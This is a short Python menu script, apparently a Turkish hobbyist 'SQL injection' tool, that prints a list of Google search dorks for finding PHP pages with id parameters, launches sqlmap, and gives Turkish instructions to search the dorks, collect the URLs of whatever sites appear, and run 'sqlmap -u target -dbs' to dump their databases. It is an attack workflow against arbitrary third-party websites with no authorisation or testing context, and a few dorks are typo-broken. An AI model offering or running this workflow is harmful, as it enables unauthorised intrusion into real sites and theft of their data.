import os

print("#########################")
print("                         ")
print("Bozkurt Sql İnjection    ")
print("                         ")
print("#########################")
print()

print("1.Dorklar")
print("2.Sqlmap")
print("3.Sql Açığı Kullanma")

işlem = input("işlem :")
if işlem =="1":
    x = input("Dorklar Gelecektir Devam Etmek İçin Enter'a Basınız")
    print("inurl:trainers.php?id=")
    print("inurl:buy.php?category=")
    print("inurlage.php?file=")
    print("inurl:forum_bds.php?num=")
    print("inurl:php?id=")
    print("inurl:newsone.php?id=")
    print("inurl:event.php?id=")
    print("inurlroduct-item.php?id=")
    print("inurl:gallery.php?id=")
    print("inurl:article.php?id=")
    print("inurl:title.php?id=")
    print("inurl:material.php?id=")
    print("inurl:rubp.php?idr=")
    print("inurl:viewapp.php?id=")
    

if işlem =="2":
    x = input("Sqlmap Açılcaktır Devam Etmek için Entar'a Basınız")
    os.system("sqlmap")

if işlem =="3":
    x= input("Kullanım Kılavuzu Açılaçaktır Entar'a Basınız")
    print("Sql Açıktan yararlanma size verdiğim dorkları 1.seçenekten alabilirsiniz internet tarayıcınıza giriniz dorku yapıştırın çıkan sitelerin url'lerini alın 2.seçenekten sqlmapi çalıştırın komut sqlmap -u hedefsite -dbs")

    
    
